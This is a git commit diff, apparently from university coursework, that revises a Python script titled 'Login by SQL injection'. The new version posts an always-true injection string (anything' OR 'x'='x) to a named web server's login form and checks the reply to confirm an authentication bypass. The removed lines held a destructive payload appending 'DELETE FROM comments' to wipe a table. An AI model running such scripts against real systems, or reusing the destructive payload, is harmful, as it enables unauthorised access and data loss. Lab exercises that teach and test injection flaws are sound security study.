48f8bcce5a669792cdb1d17820c8dfefe08737b8
xsucho08 <xsucho08@vutbr.cz>
2020-11-03 21:19:55 +0100

    Login by SQL injection

--- SQL Injection/sqlInjexction.py
+++ SQL Injection/sqlInjexction.py
@@ -1,15 +1,25 @@
 import requests
 
-
-usernameField = 'anything\' OR \'x\'=\'x'
-passwordField = 'anything\' OR \'x\'=\'x\'; DELETE FROM comments; --\';'
-
-print(usernameField)
-print(passwordField)
-
+#SELECT condition will always be true
+usernameField = ''
+passwordField = 'anything\' OR \'x\'=\'x'
 url = 'http://apache1.willilazarov.cz/'
-values = {'username': usernameField,
-          'password': passwordField}
 
-r = requests.post(url, data=values)
-print(r.content)
+payload = {'username': usernameField,
+          'password': passwordField,
+           'login':'login'
+           }
+
+#instance to make a post request to the login url with  login details as a payload
+r = requests.Session()
+r.post(url, data=payload)
+
+#all scraped data are saved to string
+data = r.get(url).text
+
+#if website contains "logout" user is loged in
+if("logout" in data):
+    print('User is now logged in')
+else:
+    print('Unable to login')
+
